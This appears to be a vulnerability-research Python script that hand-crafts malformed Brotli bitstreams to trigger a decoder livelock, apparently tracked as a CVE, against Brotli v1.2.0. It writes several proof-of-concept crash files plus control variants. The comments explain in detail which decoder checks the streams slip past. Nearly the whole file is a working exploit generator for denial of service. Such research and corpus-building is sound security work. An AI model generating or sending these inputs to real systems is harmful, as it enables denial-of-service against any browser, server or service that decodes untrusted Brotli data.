#!/usr/bin/env python3
"""Hand-built bitstreams for CVE-2026-111497 construct A2 (see
lanes/glm1/construct-map.md). Pure-Python LSB-first Brotli bit writer.
Emits into corpus/constructs/. No third-party decoders touched.

Key v1.2.0 facts baked in (all verified against the tag):
- ISUNCOMPRESSED bit is read only for NON-last metablocks.
- Simple huffman: flag(2b)=01, NSYM-1(2b), symbols at Log2Floor(alpha-1)
  bits where C Log2Floor == bit_length (lit 8b, cmd 10b, dist 6b).
- meta_block_remaining_len -= insert happens UPFRONT (can't exceed MLEN
  or BLOCK_LENGTH_1/2 fires on first ring-buffer wrap / metablock end).
- kCmdLut symbol 504: insert offset 22594 + 24 extra bits, copy 2,
  explicit distance. Symbol 32: insert 4, copy 2, implicit distance.
- block_length[0] starts at 2^24 (BROTLI_BLOCK_SIZE_CAP) with NBLTYPESL=1;
  the switch at block_length[0]==0 calls DecodeBlockTypeAndLength which
  returns FALSE for max_block_type<=1 -> unsafe machine discards it ->
  NextLiteralBlock <-> CommandInner livelock.
"""
import os

class BitWriter:
    def __init__(self):
        self.acc = 0
        self.n = 0
        self.out = bytearray()
    def put(self, value, bits):
        assert bits >= 0 and (bits == 0 or 0 <= value < (1 << bits)), (value, bits)
        self.acc |= (value & ((1 << bits) - 1)) << self.n
        self.n += bits
        while self.n >= 8:
            self.out.append(self.acc & 0xFF)
            self.acc >>= 8
            self.n -= 8
    def bytes(self):
        b = bytearray(self.out)
        if self.n:
            b.append(self.acc & 0xFF)
        return b

def varlen0(bw):        # DecodeVarLenUint8 -> value 0 (1 bit) => NBLTYPES/NTREES = 1
    bw.put(0, 1)

def simple_huff(bw, symbols, alphabet_size_max):
    """symbols: list; 1 symbol -> 0-bit code, 2 symbols -> 1-bit codes
    (bit 0 -> smaller symbol, bit 1 -> larger, per BrotliBuildSimpleHuffmanTable)."""
    bw.put(1, 2)                                    # simple code
    bw.put(len(symbols) - 1, 2)                     # NSYM-1
    mbits = max(alphabet_size_max - 1, 1).bit_length()  # C Log2Floor == bit_length
    for s in symbols:
        bw.put(s, mbits)

CMD_BURN, CMD_TINY = 504, 32   # 504: ins 22594+24b, copy 2; 32: ins 4, copy 2

def build_a2(nsym_lit=1, burn_insert_extra=16754619, pad=64,
             mlen=(1 << 24), two_cmds=True, wbits=24):
    """Primary shape: MLEN=2^24; cmd1 (sym 504) burns insert=2^24-3 literals
    (MLEN stays >= 0: upfront -i leaves 3, copy -2 leaves 1); cmd2 (sym 32,
    insert 4) trips block_length[0]==0 on its 4th literal -> switch ->
    FALSE -> livelock before any wrap/metablock-end MLEN check."""
    assert 22594 + burn_insert_extra < (1 << 24)
    bw = BitWriter()
    # WBITS: 0 -> 16; 1 + 3bits n (n!=0) -> 17+n. wbits=24 => ring 1<<24:
    # the whole 2^24-literal burn fits WITHOUT a ring wrap, so the
    # meta_block_remaining_len<0 guard (BLOCK_LENGTH_1) is never observed.
    if wbits == 16:
        bw.put(0, 1)
    else:
        assert 17 <= wbits <= 24
        bw.put(1, 1)
        bw.put(wbits - 17, 3)
    bw.put(1, 1)              # ISLAST = 1
    bw.put(0, 1)              # ISLASTEMPTY = 0
    m1 = mlen - 1
    nnib = max(4, (m1.bit_length() + 3) // 4)
    bw.put({4: 0, 5: 1, 6: 2}[nnib], 2)            # MNIBBLES code
    for i in range(nnib):
        bw.put((m1 >> (i * 4)) & 0xF, 4)
    # (no ISUNCOMPRESSED bit: ISLAST=1)
    for _ in range(3):
        varlen0(bw)                               # NBLTYPESL/C/D = 1
    bw.put(0, 2)              # NPOSTFIX = 0
    bw.put(0, 4)              # NDIRECT = 0
    bw.put(0, 2)              # CMPL = 0
    varlen0(bw)               # NTREESL = 1
    varlen0(bw)               # NTREESD = 1
    # htree groups: literal, command, distance
    if nsym_lit == 1:
        simple_huff(bw, [0], 256)                  # 0-bit literal codes
    else:
        simple_huff(bw, [0, 1], 256)               # 1-bit literal codes
    if two_cmds:
        simple_huff(bw, sorted([CMD_BURN, CMD_TINY]), 704)  # 1-bit cmd codes
    else:
        simple_huff(bw, [CMD_BURN], 704)
    simple_huff(bw, [0], 64)
    # command stream
    if two_cmds:
        bw.put(1, 1)                              # bit 1 -> larger symbol 504
        bw.put(burn_insert_extra, 24)             # insert = 22594+X = 2^24-3
        # copy extra 0; distance: 0-bit sym 0 (never actually harmful)
        bw.put(0, 1)                              # bit 0 -> smaller symbol 32
        # insert 4 > block_length[0]=3 -> 4th literal trips the switch
    else:
        bw.put(0, 1) if False else None           # single-sym tree: 0-bit code
        bw.put(burn_insert_extra, 24)
    return bytes(bw.bytes()) + b"\x00" * pad

OUT = os.path.join(os.path.dirname(__file__), "..", "corpus", "constructs")
os.makedirs(OUT, exist_ok=True)

def emit(name, data):
    with open(os.path.join(OUT, name), "wb") as f:
        f.write(data)
    print("%-24s %8d bytes" % (name, len(data)))



def build_a2_large(wbits=25, warmup=1, insert_extra=16754623, pad=64):
    """A2 under LARGE_WINDOW (app must SetParameter LARGE_WINDOW=1).
    Stream: large-window WBITS prefix (wbits up to 30); mb1 = small
    uncompressed metablock so pos>0; mb2 = MLEN 2^24 single-command burn,
    insert = 22594+insert_extra = 2^24+1.
    Ring sizing (BrotliCalculateRingBufferSize): min_size = pos + MLEN =
    1 + 2^24 > 2^24 -> ring = window (2^25, canny halving cannot shrink
    below min_size) -> the 2^24 literal burn NEVER wraps -> the MLEN<0
    guards (BLOCK_LENGTH_1/2) are never observed -> literal #2^24+1 hits
    block_length[0]==0 -> NextLiteralBlock -> max_block_type==1 ->
    DecodeBlockTypeAndLength returns FALSE -> unsafe machine discards it
    -> infinite CommandInner <-> NextLiteralBlock livelock."""
    assert 22594 + insert_extra == (1 << 24) + 1
    bw = BitWriter()
    # large-window WBITS: 1, 000, 001, 0 (selects large window), then 6-bit wbits
    bw.put(1, 1); bw.put(0, 3); bw.put(1, 3); bw.put(0, 1)
    bw.put(wbits, 6)
    # ---- metablock 1: uncompressed warmup, pos := warmup ----
    bw.put(0, 1)              # ISLAST = 0
    bw.put(0, 2)              # MNIBBLES code 0 -> 4 nibbles
    bw.put(warmup - 1, 16)    # MLEN-1
    bw.put(1, 1)              # ISUNCOMPRESSED = 1 (bit read for NON-last only)
    # byte-align, then raw payload
    while bw.n % 8:
        bw.put(0, 1)
    for k in range(warmup):
        bw.put(0x41, 8)       # 'A'
    # ---- metablock 2: the A2 burn ----
    bw.put(1, 1)              # ISLAST = 1
    bw.put(0, 1)              # ISLASTEMPTY = 0
    m1 = (1 << 24) - 1
    bw.put(2, 2)              # MNIBBLES code 2 -> 6 nibbles
    for i in range(6):
        bw.put((m1 >> (i * 4)) & 0xF, 4)   # MLEN = 2^24
    # (no ISUNCOMPRESSED bit: ISLAST=1)
    for _ in range(3):
        varlen0(bw)           # NBLTYPESL/C/D = 1
    bw.put(0, 2)              # NPOSTFIX
    bw.put(0, 4)              # NDIRECT
    bw.put(0, 2)              # CMPL
    varlen0(bw)               # NTREESL = 1
    varlen0(bw)               # NTREESD = 1
    simple_huff(bw, [0], 256)          # literal: 0-bit codes
    simple_huff(bw, [504], 704)        # cmd: burn command only
    # NB: with large_window the distance hgroup alphabet is 16+(62<<1)=140
    # (BROTLI_LARGE_MAX_DISTANCE_BITS), so simple symbols read 8 bits.
    simple_huff(bw, [0], 140)          # dist
    bw.put(insert_extra, 24)           # insert = 2^24+1
    return bytes(bw.bytes()) + b"\x00" * pad

# primary (LARGE_WINDOW): warmup + single-command 2^24+1 insert burn.
# pad 35 is the empirical minimum (guard_in slack 28B); 64 = robust margin.
emit("a2_large.br", build_a2_large())
emit("a2_large_min.br", build_a2_large(pad=35))
# primary (no large window; kept as negative-control shape: unreachable per proof)
emit("a2_nsym1.br", build_a2(nsym_lit=1))
# safe-stall variant: minimal padding (bit reader runs dry mid-burn ->
# safe machine -> spurious NEEDS_MORE_INPUT instead of livelock)
emit("a2_nsym1_short.br", build_a2(nsym_lit=1, pad=4))
# fallback: 1-bit literal codes (needs ~2MB of literal bits)
emit("a2_nsym2.br", build_a2(nsym_lit=2, pad=(1 << 21) + 64))
# ctrl: single big-insert command vs MLEN=1 -> v1.2.0 catches (BLOCK_LENGTH_2)
emit("a2_overshoot_ctrl.br", build_a2(nsym_lit=1, two_cmds=False,
                                      burn_insert_extra=1024, mlen=1))
# ctrl: burn command only, insert < MLEN, no second command -> no trigger
emit("a2_noswitch_ctrl.br", build_a2(nsym_lit=1, two_cmds=False,
                                     burn_insert_extra=1024))
